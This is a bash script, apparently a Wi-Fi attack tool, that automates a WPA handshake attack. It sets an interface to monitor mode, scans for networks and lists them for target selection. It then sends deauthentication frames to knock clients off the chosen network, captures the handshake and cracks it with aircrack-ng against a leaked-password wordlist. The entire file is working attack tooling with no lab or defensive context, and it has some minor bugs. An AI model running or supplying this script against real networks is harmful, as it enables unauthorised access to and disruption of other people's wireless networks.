resize -s 38 150 > /dev/null
#
# colors
BLUE='\033[0;34m'
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BRIGHT_PURPLE='\033[1;35m'
NC='\033[0m' # No Color



#
#
os=$(uname)
homepath=$(echo ~)
user=$(who | cut -d ' ' -f1 | sort | uniq)
interface=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')

banner () {
    echo -e "                                  
    @ github / ${BRIGHT_PURPLE}Layvth${NC} v 1.0
   " 
}
run_airodump() {
    local interface=$1
    echo -e "${GREEN}       [+] ${NC}Scanning for Wi-Fi networks on interface $interface..."
    echo -e "${RED}       [ ATTENTION }${NC} ${YELLOW}MAKE SHOUR WHEN YOU PRESS Ctrl + C YOU ARE IN XTERM TERMINAL NOT THE MAIN ONE ${NC}"
    echo -e "${YELLOW}       [+]${NC} When you Finish Scaning Press [Ctrl + c]"
    xterm -geometry 100x50 -e "airodump-ng $interface --output-format csv -w outputfile"
    filter_info outputfile-01.csv
    exit 0
}

filter_info() {
    rm final_result.txt 2>/dev/null
    local input_file=$1
    local output_file="ap_info.csv"
    # Filtering important columns: BSSID, ESSID, Channel, Encryption
    awk -F ',' 'BEGIN {OFS=","} {if ($1 != "") print $1, $4, $14, $6, $7}' "$input_file" > "$output_file"
    echo -e "${GREEN}       [+] ${NC}Filtered information saved in $output_file"
    cat ap_info.csv | awk -F ',' '/,,,/{p++} p==1 && NF>1' | sed '1,2d; s/,,,,//g' | sort -u >> final_result.txt
    rm ap_info.csv
    rm outputfile-01.csv
    choseTargetAp final_result.txt
}

sendDeauth () {
    local bssid=$1
    local interface=$2
    echo -e "${RED}"
    xterm -geometry 100x50 -e "aireplay-ng -0 10 -a $bssid $interface"
    echo -e "${NC}"

}

# Function to print table headers
choseTargetAp() {
    # Read input line by line from the file
    local input_file=$1

    # Parse the file using awk to handle variable lines and print in tabular format
    awk -F ", " '
        BEGIN {
            # Define column widths
            col1_width = 5   # Line number
            col2_width = 18  # MAC Address
            col3_width = 8   # Channel
            col4_width = 20  # ESSID
            col5_width = 12  # Security
            col6_width = 12  # Encryption
            
            # Print top border with rounded corners
            printf "      ╭───────┬────────────────────┬──────────┬──────────────────────┬──────────────┬──────────────╮\n"
            # Print header
            printf "      │ %-*s │ %-*s │ %-*s │ %-*s │ %-*s │ %-*s │\n", col1_width, "Line", col2_width, "MAC Address", col3_width, "Channel", col4_width, "ESSID", col5_width, "Security", col6_width, "Encryption"
            # Print divider
            printf "      ├───────┼────────────────────┼──────────┼──────────────────────┼──────────────┼──────────────┤\n"
            line=0
        }
        {
            line++
            # Print each field with proper formatting
            printf "      │ %-*d │ %-*s │ %-*s │ %-*s │ %-*s │ %-*s │\n", col1_width, line, col2_width, $1, col3_width, $2, col4_width, $3, col5_width, $4, col6_width, $5
        }
        END {
            # Print bottom border with rounded corners
            printf "      ╰───────┴────────────────────┴──────────┴──────────────────────┴──────────────┴──────────────╯\n"
        }' "$input_file"

    total_lines=$(wc -l < "$input_file")

    while true; do
        if [ "$total_lines" -eq "0" ]; then
            echo -e "${RED}[!] ${NC}No networks found. Try to run the script again."
            break
        elif [ "$total_lines" -eq "1" ]; then
            startAttacking "1" "$input_file"
            break
        else
            read -p "       #: Set target Network Number: " targetAp
            if [ "$targetAp" -le "$total_lines" ] 2>/dev/null && [ "$targetAp" -gt "0" ]; then
                startAttacking "$targetAp" "$input_file"
                break
            else
                echo -e "       ${YELLOW}[?] ${NC}Please select a valid number from the table."
            fi
        fi
    done
}

startAttacking () {
    local lineNum=$1
    local fileAps=$2
    local filtered=$(sed -n "${lineNum}p" "$fileAps")
    local targetAp=$(echo "$filtered" | awk '{print $3}' | sed 's/,//g')
    local targetBSSID=$(echo "$filtered" | awk '{print $1}' | sed 's/,//g')
    local targetChannel=$(echo "$filtered" | awk '{print $2}' | sed 's/,//g')
    local interface=
    echo -e "       - Your Target Network ${YELLOW}$targetAp${NC}"
    read -p "       [ Press Enter to continue ]"
    read -p "       [*] Do you Have Handshake File [y/n] : " hand_shake
    if [ "$hand_shake" == "yes" ] || [ "$hand_shake" == "y" ]; then
        echo -e "${YELLOW}      [!]${NC} if you don't have handshake file enter : ${YELLOW} ext ${NC}" 
        while true; do
            read -p "      [*] Path >: " handshake_file
            if [ -f "$path" ]; then
                break
            else
                echo -e "      File does not exist."
            fi
        done 
    else
        echo -e "${YELLOW}"
        echo -e "       Start Get handshake File"
        read -p "      [ Press Enter ]"
        getHandshake "$targetBSSID" "$targetChannel"
        echo -e "${NC}"

    fi
}

getHandshake () {
    local bssid=$1
    local channel=$2
    local interfaceLocal=$(ip link show | awk -F': ' '/^[0-9]+: [a-zA-Z0-9]+:/ {name=$2} END {print name}')
    local currentPath=$(pwd)

    cd $currentPath/handshake
    rm *
    sendDeauth "$bssid" "$interfaceLocal" &
    xterm -geometry 100x50 -e "airodump-ng -c $channel --bssid $bssid -w psk $interfaceLocal"
    aircrack_start $currentPath/handshake/psk-01.cap $bssid
}

aircrack_start() {
    local capfile=$1
    local bssid=$2
    local path_wordlist="/home/dvsys/Desktop/seclist/Passwords/Leaked-Databases/all-shit.txt"
    aircrack-ng -w "$path_wordlist" -b "$bssid" "$capfile" 2>&1
}




check_monitor_mode_support() {
    # Check if the phy80211 directory exists for the interface
    if [ -d "/sys/class/net/$interface/phy80211" ]; then
        echo -e "${GREEN}       [*] ${NC}Interface ${YELLOW}($interface)${NC} supports monitor mode !"
        mode=$(iwconfig $interface | grep "Mode:" | awk '{print $4}')
        if [ "$mode" = "Mode:Monitor" ]; then
            echo -e "       ${GREEN}[+] ${NC}You on ready in Monitro Mode !"
            checkTools
        else
            read -p "       [*] Switch ($interface) to monitor mode (y/n) :   " input 
            if [ "$input" == "yes" ] || [ "$input" == "y" ]; then
                airmon-ng start $interface >> /dev/null
                echo -e "${GREEN}       [*]~:${NC}$infterface Switched to monitor mode !"
                checkTools
            else 
                echo -e "${RED}       [!]${NC} Sorry ! we can not run this script without Monitor mode !"
            fi
        fi
        
    else
        echo -e "${RED}     [!]${NC} Interface ($interface) does not support monitor mode"
        echo -e "${RED}     [!]${NC} Error check your interface !${NC}"
        echo ""
        exit 1
    fi
}

ctrl_c () {

    if iwconfig $interface 2>/dev/null | grep -q "Mode:Monitor" ; then
        clear
        banner
        read -p "       [*] Do you want to exit from Monitor mode (yes/no) : " check
        if [ "$check" == "yes" ] 2>/dev/null || [ "$check" == "y" ]; then
            echo "       [*] Exiting from monitor Mode !"
            exit 1
        else
            echo -e "${YELLOW}       [*] ${NC}Exit !"
            exit 1
        fi
    else
        #echo -e "${YELLOW}     [*]~: ${NC}Exit !"
        clear
        echo 
        banner
        echo "      GOOD BYE SIR  "
        exit 1
    fi
}

trap ctrl_c

checkRoot () { 
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}[!]${NC} We need root permition !"
        echo -e "${YELLOW}[+]${NC} Try run with [ sudo su ] "
    else 
        clear
        banner
        check_monitor_mode_support
    fi
} 


checkTools() {
    echo -e "${GREEN}       [+]${NC} Tools checking~:"
    tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "xterm")
    tools_found=0
    for tool in "${tools[@]}"; do
        sleep 0.2
        tool_path=$(which "$tool")
        if [ "$?" -ne "0" ]; then
            echo -e "${RED}[ Not Found ] ${NC}$tool"
            echo "${YELLOW}     [!] ${NC}try [ apt-get install $tool ] "
        else
            echo -e "       ${GREEN}[!]${NC} $tool ${GREEN}✅${NC}"
            ((tools_found+=1)) # Increment the counter if the tool is found
        fi
    done
    if [ "$tools_found" -eq "${#tools[@]}" ]; then
        run_airodump $interface
    else
        echo -e "${RED}     [!] Some required tools were not found.${NC}"
        exit 1
    fi
}

checkRoot





